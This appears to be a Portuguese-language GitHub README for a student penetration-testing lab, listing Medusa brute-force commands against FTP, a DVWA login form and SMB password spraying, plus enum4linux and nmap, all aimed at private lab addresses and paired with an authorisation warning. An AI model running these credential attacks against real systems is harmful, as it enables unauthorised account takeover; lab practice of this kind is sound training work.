# Elainesds1906

Projeto desenvolvido por ElaineSds19.

## Descrição
Breve descrição do projeto. Explique o objetivo, as principais funcionalidades e tecnologias utilizadas.

## Como executar
1. Clone o repositório:
```bash
git clone https://github.com/ElaineSds19/Elainesds1906.git
cd Elainesds1906
```

2. Verifique/edite as wordlists em `passlist.txt` e `userlist.txt` conforme necessário.

3. Exemplos de comandos (execute no Kali):

- Força bruta em FTP:
```bash
medusa -h 192.168.0.32 -u msfadmin -P passlist.txt -M ftp
```

- Ataque web-form (DVWA):
```bash
medusa -h 192.168.56.101 -u admin -P passlist.txt \
  -M web-form -m FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":"login failed"
```

- Enumeração de usuários (SMB) e password spraying:
```bash
enum4linux -U 192.168.0.32
medusa -h 192.168.0.32 -U userlist.txt -p password -M smbnt
```

4. Scripts automatizados
- Há um script de exemplo em `scripts/medusa-dvwa.sh`. Torne o script executável e rode-o:
```bash
chmod +x scripts/medusa-dvwa.sh
./scripts/medusa-dvwa.sh
```

### Aviso legal e boas práticas
- Execute esses testes apenas em ambientes controlados e com autorização explícita.
- Use wordlists curtas para evitar impacto desnecessário no ambiente.
- Documente sempre os resultados, horários e evidências (salve capturas em `/images`).

---

## Exemplo de uso
Descreva ou mostre um exemplo de como usar o projeto.

## Screenshots
Adicione imagens ou GIFs demonstrando o funcionamento (opcional).

## Autor
ElaineSds19

## Licença
Defina a licença do projeto, se aplicável.
**Figura 1 —** Resultado do Nmap (`nmap -sV -A 192.168.0.32`)  
![Nmap](images/nmap-scan.png)
**Figura 1 —** Resultado do Nmap (`nmap -sV -A 192.168.0.32`).
![Evidência FTP](images/evidencias-ftp.png)